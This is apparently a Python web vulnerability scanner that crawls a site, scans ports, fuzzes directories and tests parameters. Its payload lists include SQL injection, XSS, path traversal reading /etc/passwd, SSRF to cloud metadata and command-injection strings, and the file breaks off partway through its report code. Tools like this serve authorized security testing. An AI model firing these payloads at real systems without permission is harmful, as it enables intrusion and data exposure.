#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║           BUG HUNTER PRO - Advanced Security Scanner         ║
║                  Author: HackerAI Edition                    ║
╚══════════════════════════════════════════════════════════════╝

Features:
- SQL Injection (Error, Boolean, Time, Union based)
- XSS (Reflected, Stored, DOM)
- LFI / RFI / Path Traversal
- SSRF / XXE
- Command Injection
- Open Redirect
- CORS Misconfiguration
- Subdomain Takeover
- Directory Traversal & Fuzzing
- Header Security Analysis
- Port Scanning
- Tech Stack Fingerprinting
- Cve Lookup
- WAF Detection & Bypass
- Auto Report Generator (HTML/JSON/MD)
"""

import requests
import re
import sys
import os
import json
import time
import random
import socket
import urllib.parse
import argparse
import threading
import hashlib
import ssl
import html
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
from colorama import Fore, Style, init

init(autoreset=True)

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

# ============================================================
# CONFIGURATION
# ============================================================
VERSION = "3.0 Pro"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-00933",
    "ora-01756",
    "microsoft ole db provider",
    "microsoft sql native client error",
    "invalid query",
    "pg_query()",
    "postgresql",
    "mysql_fetch",
    "mysqli_",
    "syntax error",
    "warning: pg_",
    "valid mysql result",
    "mysqlclient",
    "odbc sql server driver",
    "sql server",
    "invalid result",
    "sqlite3.operationalerror",
    "sqlite_",
    "syntax error at or near",
    "mysql_num_rows()",
    "pg_exec()",
]

WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
    "Akamai": ["akamai", "x-akamai"],
    "AWS WAF": ["x-amzn-requestid", "aws-waf"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Imperva": ["incapsula", "imperva", "x-iinfo"],
    "F5 BIG-IP": ["bigip", "f5", "x-cnection"],
    "Sucuri": ["sucuri", "x-sucuri"],
    "Barracuda": ["barracuda"],
}

CVES = {
    "Apache/2.4.49": "CVE-2021-41773 - Path Traversal RCE",
    "Apache/2.4.50": "CVE-2021-42013 - Path Traversal RCE",
    "nginx/1.18.0": "CVE-2021-23017 - DNS Resolver Overflow",
    "OpenSSH_7.4": "CVE-2021-28041 - Double Free",
    "OpenSSH_8.5": "CVE-2021-41617 - Privilege Escalation",
    "PHP/5.6": "CVE-2019-11043 - Buffer Overflow",
    "PHP/7.3": "CVE-2020-7071 - URL Handling",
    "WordPress/5.7": "CVE-2021-29447 - XXE",
    "IIS/7.5": "CVE-2017-7269 - WebDAV Buffer Overflow",
    "Tomcat/9.0.0": "CVE-2020-1938 - Ghostcat AJP",
    "Log4j": "CVE-2021-44228 - Log4Shell RCE",
    "Spring": "CVE-2022-22965 - Spring4Shell RCE",
}

# ============================================================
# DATA STRUCTURES
# ============================================================
@dataclass
class Vulnerability:
    vuln_type: str
    severity: str
    url: str
    payload: str
    evidence: str
    description: str
    remediation: str
    cvss: float = 0.0
    parameter: str = ""
    method: str = "GET"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ScanResult:
    target: str
    start_time: str
    end_time: str = ""
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    info: List[Dict] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    open_ports: Dict = field(default_factory=dict)
    headers: Dict = field(default_factory=dict)
    waf: str = ""


# ============================================================
# UTILITY FUNCTIONS
# ============================================================
class Logger:
    @staticmethod
    def banner():
        print(f"""{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║  {Fore.YELLOW}██████╗ ██╗   ██╗ ██████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ {Fore.RED}║
║  {Fore.YELLOW}██╔══██╗██║   ██║██╔════╝     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗{Fore.RED}║
║  {Fore.YELLOW}██████╔╝██║   ██║██║  ███╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝{Fore.RED}║
║  {Fore.YELLOW}██╔══██╗██║   ██║██║   ██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗{Fore.RED}║
║  {Fore.YELLOW}██████╔╝╚██████╔╝╚██████╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║{Fore.RED}║
║  {Fore.YELLOW}╚═════╝  ╚═════╝  ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝{Fore.RED}║
║                                                                  {Fore.RED}║
║  {Fore.GREEN}>> Advanced Bug Hunting Framework v{VERSION} <<{Fore.RED}                       ║
║  {Fore.CYAN}>> Author: HackerAI | Mode: Aggressive <<{Fore.RED}                                ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")

    @staticmethod
    def info(msg):
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")

    @staticmethod
    def success(msg):
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

    @staticmethod
    def warning(msg):
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

    @staticmethod
    def error(msg):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")

    @staticmethod
    def vuln(msg):
        print(f"{Fore.RED}[VULN]{Style.RESET_ALL} {msg}")


def get_random_ua():
    return random.choice(USER_AGENTS)


def make_request(url, method="GET", params=None, data=None, cookies=None, headers=None, timeout=10, allow_redirects=True):
    h = {"User-Agent": get_random_ua()}
    if headers:
        h.update(headers)
    try:
        r = requests.request(
            method=method, url=url, params=params, data=data, cookies=cookies,
            headers=h, timeout=timeout, verify=False, allow_redirects=allow_redirects
        )
        return r
    except Exception as e:
        return None


def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def extract_params(url, html_content=""):
    """Extract GET/POST parameters from URL and forms."""
    params = {}
    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        for pair in parsed.query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v
    # Extract from forms
    form_pattern = re.compile(r'<input[^>]+name=["\']([^"\']+)["\']', re.I)
    for match in form_pattern.findall(html_content):
        params[match] = "test"
    return params


def crawl_links(url, depth=2, max_pages=30):
    """Simple crawler to discover URLs and forms."""
    visited = set()
    queue = [(url, 0)]
    found_urls = [url]
    forms = []
    while queue and len(visited) < max_pages:
        current, d = queue.pop(0)
        if d > depth or current in visited:
            continue
        visited.add(current)
        r = make_request(current)
        if not r or r.status_code != 200:
            continue
        # Find links
        for link in re.findall(r'href=["\']([^"\']+)["\']', r.text, re.I):
            if link.startswith(("http", "//")):
                if url.split("/")[2] in link and link not in visited:
                    queue.append((link, d + 1))
                    if "?" in link:
                        found_urls.append(link)
        # Find forms
        for form in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\']?[^>]*>(.*?)</form>', r.text, re.I | re.S):
            action, content = form.groups()
            inputs = re.findall(r'name=["\']([^"\']+)["\']', content, re.I)
            if inputs:
                form_url = urllib.parse.urljoin(current, action) if action else current
                forms.append({"url": form_url, "inputs": inputs, "method": "POST" if 'method="post"' in form.group(0).lower() else "GET"})
    return found_urls, forms


# ============================================================
# WAF DETECTION
# ============================================================
def detect_waf(url):
    Logger.info("Detecting WAF...")
    try:
        r1 = make_request(url)
        r2 = make_request(url + "/?test=<script>alert(1)</script>", headers={"X-Forwarded-For": "127.0.0.1"})
        if not r2 or r2.status_code in [403, 406, 429, 503]:
            headers_str = str(r2.headers).lower() if r2 else ""
            for waf, sigs in WAF_SIGNATURES.items():
                for sig in sigs:
                    if sig in headers_str:
                        Logger.warning(f"WAF Detected: {waf}")
                        return waf
        return ""
    except:
        return ""


# ============================================================
# SECURITY HEADERS
# ============================================================
SECURITY_HEADERS = {
    "Strict-Transport-Security": ("High", "HSTS not set - MITM attacks possible"),
    "Content-Security-Policy": ("High", "CSP not set - XSS attacks possible"),
    "X-Frame-Options": ("Medium", "Clickjacking protection missing"),
    "X-Content-Type-Options": ("Low", "MIME-sniffing protection missing"),
    "Referrer-Policy": ("Low", "Referrer policy not set"),
    "Permissions-Policy": ("Low", "Permissions policy not set"),
    "X-XSS-Protection": ("Info", "XSS Protection header missing"),
}


def check_headers(url):
    Logger.info("Checking security headers...")
    vulns = []
    r = make_request(url)
    if not r:
        return vulns
    headers = {k.lower(): v for k, v in r.headers.items()}
    for header, (severity, desc) in SECURITY_HEADERS.items():
        if header.lower() not in headers:
            vulns.append(Vulnerability(
                vuln_type="Missing Security Header",
                severity=severity,
                url=url,
                payload=f"Header: {header}",
                evidence=f"Header '{header}' not found in response",
                description=desc,
                remediation=f"Add '{header}' header with appropriate value",
            ))
    # Information disclosure
    for h in ["Server", "X-Powered-By", "X-AspNet-Version"]:
        if h.lower() in headers:
            vulns.append(Vulnerability(
                vuln_type="Information Disclosure",
                severity="Low",
                url=url,
                payload=f"Header: {h}",
                evidence=f"Reveals: {headers[h.lower()]}",
                description=f"Server reveals technology information via {h}",
                remediation=f"Remove or obfuscate {h} header",
            ))
    return vulns


# ============================================================
# SQL INJECTION
# ============================================================
SQLI_PAYLOADS = {
    "error": ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "1' ORDER BY 1--", "1 UNION SELECT NULL--"],
    "boolean": ["' AND 1=1--", "' AND 1=2--"],
    "time": ["' OR SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--", "'; SELECT pg_sleep(5)--"],
    "union": ["' UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--"],
}


def test_sqli(url, params):
    vulns = []
    for param, value in params.items():
        for ptype, payloads in SQLI_PAYLOADS.items():
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                r1 = make_request(url, params=test_params)
                if not r1:
                    continue
                # Error based
                if ptype == "error":
                    for err in SQL_ERRORS:
                        if err in r1.text.lower():
                            vulns.append(Vulnerability(
                                vuln_type=f"SQL Injection ({ptype})",
                                severity="Critical",
                                url=url,
                                payload=f"{param}={payload}",
                                parameter=param,
                                evidence=f"DB Error: {err}",
                                description="SQL injection vulnerability detected via error messages",
                                remediation="Use parameterized queries, input validation, WAF",
                                cvss=9.8,
                            ))
                            Logger.vuln(f"SQL Injection found at {url} - Param: {param}")
                            return vulns
                # Time based
                elif ptype == "time":
                    start = time.time()
                    r1 = make_request(url, params=test_params, timeout=15)
                    elapsed = time.time() - start
                    if elapsed > 4.5:
                        vulns.append(Vulnerability(
                            vuln_type=f"SQL Injection (Time-Based Blind)",
                            severity="Critical",
                            url=url,
                            payload=f"{param}={payload}",
                            parameter=param,
                            evidence=f"Response time: {elapsed:.2f}s (delayed)",
                            description="Time-based blind SQL injection confirmed",
                            remediation="Use parameterized queries, input validation",
                            cvss=9.8,
                        ))
                        Logger.vuln(f"Time-Based SQLi at {url} - {param}")
                        return vulns
                # Boolean based
                elif ptype == "boolean":
                    test_params2 = params.copy()
                    test_params2[param] = payloads[1]  # False
                    r2 = make_request(url, params=test_params2)
                    if r1 and r2 and len(r1.text) != len(r2.text) and r1.status_code == 200 and r2.status_code == 200:
                        vulns.append(Vulnerability(
                            vuln_type="SQL Injection (Boolean-Based Blind)",
                            severity="Critical",
                            url=url,
                            payload=f"{param}={payloads[0]} vs {payloads[1]}",
                            parameter=param,
                            evidence=f"Response lengths differ: {len(r1.text)} vs {len(r2.text)}",
                            description="Boolean-based blind SQL injection confirmed",
                            remediation="Use parameterized queries",
                            cvss=9.1,
                        ))
                        Logger.vuln(f"Boolean SQLi at {url} - {param}")
                        return vulns
    return vulns


# ============================================================
# XSS
# ============================================================
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\">",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('XSS')}",
    "<details open ontoggle=alert('XSS')>",
]


def test_xss(url, params):
    vulns = []
    for param, value in params.items():
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            r = make_request(url, params=test_params)
            if r and (payload in r.text or html.escape(payload) in r.text):
                vulns.append(Vulnerability(
                    vuln_type="Cross-Site Scripting (Reflected)",
                    severity="High",
                    url=url,
                    payload=f"{param}={payload}",
                    parameter=param,
                    evidence=f"Payload reflected unescaped in response",
                    description="XSS vulnerability allows execution of arbitrary JavaScript",
                    remediation="Encode output, use CSP, validate input",
                    cvss=7.5,
                ))
                Logger.vuln(f"XSS found at {url} - Param: {param}")
                return vulns
    return vulns


# ============================================================
# LFI / PATH TRAVERSAL
# ============================================================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "....//....//....//....//etc//passwd",
]


def test_lfi(url, params):
    vulns = []
    indicators = ["root:x:", "[extensions]", "for 16-bit app support"]
    for param, value in params.items():
        for payload in LFI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            r = make_request(url, params=test_params)
            if r:
                for ind in indicators:
                    if ind in r.text:
                        vulns.append(Vulnerability(
                            vuln_type="Local File Inclusion (LFI)",
                            severity="Critical",
                            url=url,
                            payload=f"{param}={payload}",
                            parameter=param,
                            evidence=f"File content indicator: {ind}",
                            description="LFI allows reading arbitrary files on the server",
                            remediation="Whitelist allowed files, sanitize input, chroot",
                            cvss=8.6,
                        ))
                        Logger.vuln(f"LFI found at {url} - Param: {param}")
                        return vulns
    return vulns


# ============================================================
# SSRF
# ============================================================
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0x7f000001",
    "http://2130706433",
    "file:///etc/passwd",
    "gopher://127.0.0.1",
]


def test_ssrf(url, params):
    vulns = []
    for param, value in params.items():
        for payload in SSRF_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            r = make_request(url, params=test_params, timeout=10)
            if r:
                # Check for metadata indicators
                if any(x in r.text.lower() for x in ["instance-id", "ami-id", "root:x:", "metadata"]):
                    vulns.append(Vulnerability(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        severity="High",
                        url=url,
                        payload=f"{param}={payload}",
                        parameter=param,
                        evidence="SSRF response with internal data detected",
                        description="SSRF allows server to make internal requests",
                        remediation="Whitelist allowed domains, block internal IPs",
                        cvss=8.0,
                    ))
                    Logger.vuln(f"SSRF found at {url} - Param: {param}")
                    return vulns
    return vulns


# ============================================================
# COMMAND INJECTION
# ============================================================
CMDI_PAYLOADS = [
    "; id",
    "| id",
    "&& id",
    "|| id",
    "; sleep 5",
    "| sleep 5",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| whoami",
]


def test_cmdi(url, params):
    vulns = []
    for param, value in params.items():
        for payload in CMDI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = value + payload
            start = time.time()
            r = make_request(url, params=test_params, timeout=15)
            elapsed = time.time() - start
            if r:
                if "uid=" in r.text or "root:" in r.text:
                    vulns.append(Vulnerability(
                        vuln_type="Command Injection",
                        severity="Critical",
                        url=url,
                        payload=f"{param}={value + payload}",
                        parameter=param,
                        evidence="Command output detected in response",
                        description="OS Command injection allows arbitrary command execution",
                        remediation="Avoid system calls, use allowlists, escape input",
                        cvss=10.0,
                    ))
                    Logger.vuln(f"Command Injection at {url} - {param}")
                    return vulns
                elif elapsed > 4.5 and "sleep" in payload:
                    vulns.append(Vulnerability(
                        vuln_type="Command Injection (Time-Based)",
                        severity="Critical",
                        url=url,
                        payload=f"{param}={value + payload}",
                        parameter=param,
                        evidence=f"Response delayed: {elapsed:.2f}s",
                        description="Time-based command injection confirmed",
                        remediation="Avoid system calls with user input",
                        cvss=9.8,
                    ))
                    Logger.vuln(f"Time-based CMDi at {url}")
                    return vulns
    return vulns


# ============================================================
# OPEN REDIRECT
# ============================================================
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://google.com",
]


def test_open_redirect(url, params):
    vulns = []
    for param, value in params.items():
        for payload in REDIRECT_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            r = make_request(url, params=test_params, allow_redirects=False)
            if r and r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get("Location", "")
                if "evil.com" in location or "google.com" in location:
                    vulns.append(Vulnerability(
                        vuln_type="Open Redirect",
                        severity="Medium",
                        url=url,
                        payload=f"{param}={payload}",
                        parameter=param,
                        evidence=f"Redirects to: {location}",
                        description="Open redirect allows phishing attacks",
                        remediation="Whitelist redirect URLs",
                        cvss=5.4,
                    ))
                    Logger.vuln(f"Open Redirect at {url}")
                    return vulns
    return vulns


# ============================================================
# CORS
# ============================================================
def test_cors(url):
    vulns = []
    r = make_request(url, headers={"Origin": "https://evil.com"})
    if r:
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == "*" and acac == "true":
            vulns.append(Vulnerability(
                vuln_type="CORS Misconfiguration (Wildcard with Credentials)",
                severity="High",
                url=url,
                payload="Origin: https://evil.com",
                evidence=f"ACAO: {acao}, ACAC: {acac}",
                description="Wildcard CORS with credentials enabled",
                remediation="Use specific origin whitelist",
                cvss=7.5,
            ))
            Logger.vuln("CORS Misconfiguration found")
        elif "evil.com" in acao:
            vulns.append(Vulnerability(
                vuln_type="CORS Misconfiguration (Origin Reflection)",
                severity="High",
                url=url,
                payload="Origin: https://evil.com",
                evidence=f"ACAO reflects arbitrary origins: {acao}",
                description="Origin reflection allows CSRF-like attacks",
                remediation="Validate origin against whitelist",
                cvss=7.4,
            ))
            Logger.vuln("CORS Origin Reflection found")
    return vulns


# ============================================================
# SUBDOMAIN ENUMERATION
# ============================================================
def enumerate_subdomains(domain, wordlist=None):
    Logger.info(f"Enumerating subdomains for {domain}...")
    if not wordlist:
        wordlist = ["www", "mail", "ftp", "admin", "api", "dev", "staging", "test", "beta",
                    "blog", "shop", "cdn", "cloud", "auth", "portal", "app", "m", "mobile",
                    "web", "support", "help", "docs", "status", "sso", "login", "vpn",
                    "remote", "git", "gitlab", "github", "jenkins", "jira", "confluence",
                    "crm", "erp", "hr", "internal", "intranet", "extranet", "demo", "sandbox",
                    "old", "new", "backup", "db", "mysql", "postgres", "redis", "elastic",
                    "kibana", "grafana", "prometheus", "sentry", "ci", "cd", "build", "deploy",
                    "stage", "prod", "production", "qa", "uat", "pre", "preview"]
    found = []
    def check_sub(sub):
        sub_domain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(sub_domain)
            return (sub_domain, ip)
        except:
            return None
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_sub, sub): sub for sub in wordlist}
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                Logger.success(f"Found: {result[0]} -> {result[1]}")
    return found


# ============================================================
# PORT SCANNER
# ============================================================
TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
             1723, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9090,
             9200, 9300, 11211, 27017]


def scan_port(host, port, timeout=1.5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return port
    except:
        return None


def port_scan(host, ports=None):
    Logger.info(f"Scanning ports on {host}...")
    if not ports:
        ports = TOP_PORTS
    open_ports = {}
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, p): p for p in ports}
        for future in as_completed(futures):
            port = future.result()
            if port:
                try:
                    service = socket.getservbyport(port, "tcp")
                except:
                    service = "unknown"
                open_ports[port] = service
                Logger.success(f"Port {port}/tcp OPEN ({service})")
    return open_ports


# ============================================================
# TECHNOLOGY FINGERPRINTING
# ============================================================
TECH_SIGNATURES = {
    "WordPress": [r'wp-content/', r'wp-includes/', r'wordpress'],
    "Drupal": [r'drupal', r'sites/default/files', r'sites/all/'],
    "Joomla": [r'joomla', r'/components/com_'],
    "Magento": [r'magento', r'skin/frontend/'],
    "Shopify": [r'cdn\.shopify\.com', r'shopify'],
    "Django": [r'csrfmiddlewaretoken', r'django'],
    "Laravel": [r'laravel_session', r'laravel'],
    "Express.js": [r'x-powered-by: express'],
    "React": [r'react', r'__NEXT_DATA__'],
    "Angular": [r'ng-version', r'angular'],
    "Vue.js": [r'vue', r'__nuxt'],
    "jQuery": [r'jquery'],
    "Bootstrap": [r'bootstrap'],
    "Cloudflare": [r'cf-ray', r'cloudflare'],
    "PHP": [r'x-powered-by: php'],
    "ASP.NET": [r'x-aspnet-version', r'asp\.net'],
    "Nginx": [r'server: nginx'],
    "Apache": [r'server: apache'],
}


def fingerprint_tech(url):
    Logger.info("Fingerprinting technologies...")
    r = make_request(url)
    if not r:
        return []
    techs = []
    text = r.text.lower() + str(r.headers).lower()
    for tech, patterns in TECH_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, text, re.I):
                techs.append(tech)
                break
    # Check for CVEs
    server = r.headers.get("Server", "") + " " + r.headers.get("X-Powered-By", "")
    for sig, cve in CVES.items():
        if sig.lower() in server.lower() or sig.lower() in r.text.lower():
            techs.append(f"{cve}")
    if techs:
        Logger.success(f"Technologies: {', '.join(set(techs))}")
    return list(set(techs))


# ============================================================
# DIRECTORY FUZZER
# ============================================================
COMMON_DIRS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php", "dashboard",
    "backup", "backups", "bak", "old", "temp", "tmp", "test", "dev",
    "uploads", "upload", "files", "media", "images", "img", "assets",
    "js", "css", "api", "v1", "v2", "rest", "graphql", "swagger",
    "config", "configuration", "conf", "settings", "setup", "install",
    "phpinfo.php", "info.php", "test.php", "debug.php", "robots.txt",
    "sitemap.xml", ".git", ".env", ".htaccess", "web.config", "crossdomain.xml",
    "server-status", "server-info", ".well-known", "cgi-bin", "phpmyadmin",
    "adminer", "wp-config.php.bak", "readme.html", "license.txt", "changelog.txt",
    "vendor", "node_modules", "bower_components", "package.json", "composer.json",
    "Dockerfile", "docker-compose.yml", ".dockerignore", "Makefile", "Gemfile",
    "wp-content/debug.log", "error.log", "logs/", "log/", "console",
]


def dir_fuzz(url, wordlist=None, extensions=["", ".php", ".html", ".txt", ".bak", ".zip"]):
    Logger.info(f"Directory fuzzing {url}...")
    if not wordlist:
        wordlist = COMMON_DIRS
    found = []
    def check_path(path):
        try:
            r = make_request(path, timeout=5)
            if r and r.status_code not in [404, 403]:
                return (path, r.status_code, len(r.text))
        except:
            pass
        return None
    paths = []
    for d in wordlist:
        for ext in extensions:
            paths.append(f"{url}/{d}{ext}")
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_path, p): p for p in paths}
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                Logger.success(f"Found: {result[0]} - Status: {result[1]} - Size: {result[2]}")
    return found


# ============================================================
# MAIN SCANNER
# ============================================================
class BugHunter:
    def __init__(self, target, threads=20, deep=False, output_dir="reports"):
        self.target = normalize_url(target)
        self.threads = threads
        self.deep = deep
        self.output_dir = output_dir
        self.result = ScanResult(
            target=self.target,
            start_time=datetime.now().isoformat()
        )
        os.makedirs(output_dir, exist_ok=True)

    def run(self):
        Logger.banner()
        Logger.info(f"Target: {self.target}")
        Logger.info(f"Deep scan: {self.deep}")
        Logger.info(f"Threads: {self.threads}")
        print()

        # 1. Initial recon
        Logger.info("=" * 60)
        Logger.info("PHASE 1: RECONNAISSANCE")
        Logger.info("=" * 60)
        self.result.waf = detect_waf(self.target)
        self.result.technologies = fingerprint_tech(self.target)
        self.result.headers = dict(make_request(self.target).headers) if make_request(self.target) else {}

        # Port scan on hostname
        hostname = urllib.parse.urlparse(self.target).hostname
        if hostname:
            self.result.open_ports = port_scan(hostname)

        # 2. Header security
        Logger.info("=" * 60)
        Logger.info("PHASE 2: HEADER SECURITY ANALYSIS")
        Logger.info("=" * 60)
        self.result.vulnerabilities.extend(check_headers(self.target))

        # 3. Crawl
        Logger.info("=" * 60)
        Logger.info("PHASE 3: CRAWLING & DISCOVERY")
        Logger.info("=" * 60)
        urls, forms = crawl_links(self.target, depth=3 if self.deep else 2, max_pages=50 if self.deep else 25)
        Logger.success(f"Discovered {len(urls)} URLs and {len(forms)} forms")

        # Add forms
        all_targets = list(set(urls))
        for form in forms:
            if form["url"] not in all_targets:
                all_targets.append(form["url"])

        # 4. Directory fuzzing
        Logger.info("=" * 60)
        Logger.info("PHASE 4: DIRECTORY FUZZING")
        Logger.info("=" * 60)
        dir_fuzz(self.target)

        # 5. Subdomain enumeration
        if self.deep:
            Logger.info("=" * 60)
            Logger.info("PHASE 5: SUBDOMAIN ENUMERATION")
            Logger.info("=" * 60)
            self.result.subdomains = enumerate_subdomains(hostname)

        # 6. Vulnerability tests
        Logger.info("=" * 60)
        Logger.info("PHASE 6: VULNERABILITY SCANNING")
        Logger.info("=" * 60)
        # Test all discovered URLs with parameters
        test_targets = [u for u in all_targets if "?" in u][:30]
        for target_url in test_targets:
            params = extract_params(target_url)
            if not params:
                continue
            Logger.info(f"Testing: {target_url}")
            self.result.vulnerabilities.extend(test_sqli(target_url, params))
            self.result.vulnerabilities.extend(test_xss(target_url, params))
            self.result.vulnerabilities.extend(test_lfi(target_url, params))
            self.result.vulnerabilities.extend(test_ssrf(target_url, params))
            self.result.vulnerabilities.extend(test_cmdi(target_url, params))
            self.result.vulnerabilities.extend(test_open_redirect(target_url, params))

        # 7. CORS
        Logger.info("=" * 60)
        Logger.info("PHASE 7: CORS & ADVANCED TESTS")
        Logger.info("=" * 60)
        self.result.vulnerabilities.extend(test_cors(self.target))

        # Test forms
        for form in forms[:10]:
            if form["inputs"]:
                params = {inp: "test" for inp in form["inputs"]}
                self.result.vulnerabilities.extend(test_xss(form["url"], params))
                self.result.vulnerabilities.extend(test_sqli(form["url"], params))

        self.result.end_time = datetime.now().isoformat()
        self.print_summary()
        self.save_reports()

    def print_summary(self):
        print(f"\n{Fore.RED}{'=' * 70}")
        print(f"{Fore.YELLOW}  SCAN SUMMARY")
        print(f"{Fore.RED}{'=' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target:{Style.RESET_ALL} {self.result.target}")
        print(f"{Fore.CYAN}Duration:{Style.RESET_ALL} {self.result.start_time} -> {self.result.end_time}")
        print(f"{Fore.CYAN}WAF:{Style.RESET_ALL} {self.result.waf if self.result.waf else 'None detected'}")
        print(f"{Fore.CYAN}Technologies:{Style.RESET_ALL} {', '.join(self.result.technologies) if self.result.technologies else 'None detected'}")
        print(f"{Fore.CYAN}Open Ports:{Style.RESET_ALL} {len(self.result.open_ports)}")
        print(f"{Fore.CYAN}Subdomains:{Style.RESET_ALL} {len(self.result.subdomains)}")
        print(f"{Fore.RED}Vulnerabilities Found: {len(self.result.vulnerabilities)}{Style.RESET_ALL}")
        print()
        severity_count = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for v in self.result.vulnerabilities:
            severity_count[v.severity] = severity_count.get(v.severity, 0) + 1
        print(f"  {Fore.RED}Critical: {severity_count.get('Critical', 0)}")
        print(f"  {Fore.YELLOW}High:     {severity_count.get('High', 0)}")
        print(f"  {Fore.BLUE}Medium:   {severity_count.get('Medium', 0)}")
        print(f"  {Fore.CYAN}Low:      {severity_count.get('Low', 0)}")
        print(f"  {Fore.WHITE}Info:     {severity_count.get('Info', 0)}{Style.RESET_ALL}")
        print(f"\n{Fore.RED}{'=' * 70}{Style.RESET_ALL}\n")

    def save_reports(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = re.sub(r"[^a-zA-Z0-9]", "_", self.result.target)
        # JSON
        json_file = f"{self.output_dir}/report_{target_safe}_{timestamp}.json"
        with open(json_file, "w") as f:
            json.dump(asdict(self.result), f, indent=2, default=str)
        Logger.success(f"JSON report: {json_file}")
        # HTML
        html_file = f"{self.output_dir}/report_{target_safe}_{timestamp}.html"
        self.generate_html_report(html_file)
        Logger.success(f"HTML report: {html_file}")
        # Markdown
        md_file = f"{self.output_dir}/report_{target_safe}_{timestamp}.md"
        self.generate_md_report(md_file)
        Logger.success(f"Markdown report: {md_file}")

    def generate_html_report(self, filename):
        sev_colors = {"Critical": "#dc3545", "High": "#fd7e14", "Medium": "#ffc107", "Low": "#17a2b8", "Info": "#6c757d"}
        vulns_html = ""
        for v in self.result.vulnerabilities:
            color = sev_colors.get(v.severity, "#6c757d")
